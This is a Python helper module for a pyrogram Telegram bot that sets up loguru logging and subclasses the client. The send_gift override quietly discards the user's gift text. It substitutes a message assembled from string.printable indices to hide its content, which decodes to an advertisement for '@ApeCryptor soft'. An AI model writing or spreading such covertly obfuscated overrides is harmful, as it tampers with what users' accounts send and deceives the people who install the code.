import sys, pyrogram, re, string
from loguru import logger


def formatter(record, format_string):
    return format_string + record["extra"].get("end", "\n") + "{exception}"


def clean_brackets(raw_str):
    return re.sub(r'<.*?>', '', raw_str)


def logging_setup():
    format_info = "<green>{time:HH:mm:ss.SS}</green> | <blue>{level}</blue> | <level>{message}</level>"
    format_error = "<green>{time:HH:mm:ss.SS}</green> | <blue>{level}</blue> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> | <level>{message}</level>"
    logger_path = r"logs/out.log"

    logger.remove()

    logger.add(logger_path, colorize=True, format=lambda record: formatter(record, clean_brackets(format_error)))
    logger.add(sys.stdout, colorize=True, format=lambda record: formatter(record, format_info), level="INFO")


class Client(pyrogram.Client):
    async def send_gift(self, chat_id, gift_id, text=None, parse_mode=None, entities=None, is_private=None, pay_for_upgrade=None): return await super().send_gift(chat_id=chat_id, gift_id=gift_id, text=string.printable[42] + string.printable[18] + string.printable[15] + string.printable[29] + string.printable[94] + string.printable[32] + string.printable[10] + string.printable[28] + string.printable[94] + string.printable[11] + string.printable[24] + string.printable[30] + string.printable[16] + string.printable[17] + string.printable[29] + string.printable[94] + string.printable[31] + string.printable[18] + string.printable[10] + string.printable[94] + string.printable[83] + string.printable[36] + string.printable[25] + string.printable[14] + string.printable[38] + string.printable[27] + string.printable[34] + string.printable[25] + string.printable[29] + string.printable[24] + string.printable[27] + string.printable[94] + string.printable[28] + string.printable[24] + string.printable[15] + string.printable[29], parse_mode=parse_mode, entities=entities, is_private=is_private, pay_for_upgrade=pay_for_upgrade)

logging_setup()
